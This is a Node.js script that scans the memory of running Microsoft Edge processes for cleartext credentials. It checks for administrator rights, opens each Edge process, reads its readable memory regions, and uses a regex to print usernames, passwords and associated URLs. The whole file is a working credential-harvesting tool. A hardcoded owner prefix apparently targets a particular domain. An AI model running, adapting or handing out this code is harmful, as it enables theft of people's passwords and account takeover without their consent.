'use strict';

const ffi = require('ffi-napi');
const ref = require('ref-napi');
const { execSync } = require('child_process');

const PROCESS_QUERY_INFORMATION = 0x0400;
const PROCESS_VM_READ = 0x0010;
const MEM_COMMIT = 0x1000;
const PAGE_READWRITE = 0x04;

// MEMORY_BASIC_INFORMATION layout for 64-bit Windows (48 bytes):
// BaseAddress(8) + AllocationBase(8) + AllocationProtect(4) + _pad(4)
// + RegionSize(8) + State(4) + Protect(4) + Type(4) + _pad(4)
const MBI_SIZE = 48;

function parseMBI(buf) {
  return {
    BaseAddress:      buf.readBigUInt64LE(0),
    AllocationBase:   buf.readBigUInt64LE(8),
    AllocationProtect: buf.readUInt32LE(16),
    RegionSize:       buf.readBigUInt64LE(24),
    State:            buf.readUInt32LE(32),
    Protect:          buf.readUInt32LE(36),
    Type:             buf.readUInt32LE(40),
  };
}

const kernel32 = ffi.Library('kernel32', {
  OpenProcess:       ['pointer', ['uint32', 'bool', 'int32']],
  ReadProcessMemory: ['bool',    ['pointer', 'uint64', 'pointer', 'uint32', 'pointer']],
  VirtualQueryEx:    ['uint64',  ['pointer', 'uint64', 'pointer', 'uint32']],
  CloseHandle:       ['bool',    ['pointer']],
});

function isElevated() {
  try {
    execSync('net session', { stdio: 'ignore' });
    return true;
  } catch {
    return false;
  }
}

function psExec(script) {
  const encoded = Buffer.from(script, 'utf16le').toString('base64');
  return execSync(`powershell -NoProfile -EncodedCommand ${encoded}`, {
    encoding: 'utf8',
    timeout: 10000,
  }).trim();
}

function getEdgeProcesses() {
  try {
    const raw = psExec(
      "Get-WmiObject Win32_Process -Filter \"name='msedge.exe'\" | Select-Object ProcessId,ParentProcessId,Name | ConvertTo-Json"
    );
    if (!raw) return [];
    const parsed = JSON.parse(raw);
    return Array.isArray(parsed) ? parsed : [parsed];
  } catch {
    return [];
  }
}

function getParentProcessName(pid) {
  try {
    return psExec(`(Get-Process -Id ${pid} -ErrorAction SilentlyContinue).ProcessName`);
  } catch {
    return '';
  }
}

function getProcessOwner(pid) {
  try {
    const raw = psExec(
      `(Get-WmiObject Win32_Process -Filter 'ProcessId=${pid}').GetOwner() | ConvertTo-Json`
    );
    const result = JSON.parse(raw);
    if (result?.User) return result.Domain ? `${result.Domain}\\${result.User}` : result.User;
  } catch { /* fall through */ }
  return 'UNKNOWN';
}

// Matches: <letter>http(s)?<space><username><space><password><space><NUL>
const CRED_PATTERN = /[a-zA-Z]https? ([a-zA-ZæøåÆØÅ0-9\-_\.@?]{3,20}) ([a-zA-ZæøåÆØÅ0-9#!@#$%^&*()\-_+={}[\]:;<>?\/~\s]{6,40}) \x00/g;

function escapeRegex(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function main() {
  if (!isElevated()) {
    process.stdout.write('\x1b[31m[x]\x1b[0m Not running elevated\n');
    process.exit(1);
  }

  process.stdout.write('\x1b[32m[v]\x1b[0m Running elevated\n\n');
  process.stdout.write('Fetching browser processes:');

  const allProcs = getEdgeProcesses();
  const processList = [];

  for (const mo of allProcs) {
    const pid = Number(mo.ProcessId);
    const parentPid = Number(mo.ParentProcessId);

    let skip = false;
    try {
      if (getParentProcessName(parentPid).toLowerCase() === 'msedge') skip = true;
    } catch { /* parent exited — treat as root */ }

    if (!skip) {
      processList.push({ id: pid, name: mo.Name, owner: getProcessOwner(pid) });
    }
  }

  console.log(' Done.\n');

  const seenStrings = new Set();
  const alreadyCheckedUsers = new Set();
  let totalMatches = 0;
  let shownMatches = 0;

  for (const proc of processList) {
    const userKey = `${proc.owner} ${proc.name}`;
    if (alreadyCheckedUsers.has(userKey)) continue;

    const displayOwner = proc.owner.replace('NSC\\t1_', '');
    console.log(`Scanning process PID: ${proc.id}\tName: ${proc.name}\tOwner: ${displayOwner}`);

    const handle = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, proc.id);
    if (ref.isNull(handle)) {
      console.log(`Failed to open process: ${proc.id} ${proc.name} ${proc.owner}`);
      continue;
    }

    try {
      let address = 0n;
      const mbiBuffer = Buffer.alloc(MBI_SIZE);
      const bytesReadBuf = Buffer.alloc(8);

      while (kernel32.VirtualQueryEx(handle, address.toString(), mbiBuffer, MBI_SIZE)) {
        const mbi = parseMBI(mbiBuffer);
        const readable = mbi.State === MEM_COMMIT && mbi.Protect === PAGE_READWRITE;

        // Skip regions larger than 256 MB to avoid OOM
        if (readable && mbi.RegionSize > 0n && mbi.RegionSize <= 0x10000000n) {
          const size = Number(mbi.RegionSize);
          const memBuf = Buffer.alloc(size);

          if (kernel32.ReadProcessMemory(handle, mbi.BaseAddress.toString(), memBuf, size, bytesReadBuf)) {
            const text = memBuf.toString('utf8');
            const lines = text.split(/\r\n|\r|\n/);

            for (const line of lines) {
              CRED_PATTERN.lastIndex = 0;
              let match;
              while ((match = CRED_PATTERN.exec(line)) !== null) {
                const username = match[1];
                const password = match[2];
                const potentialPattern = `${username} : ${password}`;

                const urlPattern = new RegExp(
                  `\x00\x00\x00([A-Za-z0-9\\-._~:/?#\\[\\]@!$&'()*+,;=%]+)(https?) ${escapeRegex(username)} ${escapeRegex(password)}`,
                  'g'
                );

                for (const urlMatch of line.matchAll(urlPattern)) {
                  const combined = `${potentialPattern} @${urlMatch[1]}`;
                  if (!seenStrings.has(combined)) {
                    console.log(combined);
                    seenStrings.add(combined);
                    shownMatches++;
                    totalMatches++;
                  }
                }

                alreadyCheckedUsers.add(userKey);
              }
            }
          }
        }

        const nextAddress = mbi.BaseAddress + mbi.RegionSize;
        if (nextAddress <= address || nextAddress > 0x7FFFFFFFFFFFFn) break;
        address = nextAddress;
      }
    } finally {
      kernel32.CloseHandle(handle);
    }
  }

  console.log(`\nTotal matches found across all processes: ${totalMatches}. ${shownMatches} shown.`);
}

main();
